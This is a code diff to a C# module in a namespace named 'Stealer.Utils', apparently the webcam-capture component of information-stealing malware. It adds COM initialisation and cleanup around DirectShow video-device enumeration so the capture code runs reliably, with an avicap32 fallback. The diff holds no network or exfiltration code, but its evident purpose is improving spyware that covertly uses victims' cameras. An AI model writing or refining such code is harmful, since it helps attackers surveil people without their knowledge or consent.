@@ -48,6 +48,11 @@ namespace Stealer.Utils
         private static Thread _captureThread;
         private static volatile bool _running;
 
+        [DllImport("ole32.dll")]
+        private static extern int CoInitializeEx(IntPtr pvReserved, int dwCoInit);
+        [DllImport("ole32.dll")]
+        private static extern void CoUninitialize();
+
         // DirectShow / capCreateCaptureWindowA via avicap32.dll
         [DllImport("avicap32.dll", EntryPoint = "capCreateCaptureWindowA", CharSet = CharSet.Ansi)]
         private static extern IntPtr capCreateCaptureWindowA(
@@ -98,6 +103,7 @@ namespace Stealer.Utils
         {
             var list = new System.Collections.Generic.List<string>();
 
+            CoInitializeEx(IntPtr.Zero, 0x2); // COINIT_APARTMENTTHREADED
             try
             {
                 Guid category = new Guid("860BB310-5D01-11d0-BD3B-00A0C911CE86"); // CLSID_VideoInputDeviceCategory
@@ -147,6 +153,7 @@ namespace Stealer.Utils
                 }
             }
             catch { }
+            finally { CoUninitialize(); }
 
             // Fallback to avicap32 if DirectShow enumerator had 0 entries
             if (list.Count == 0)
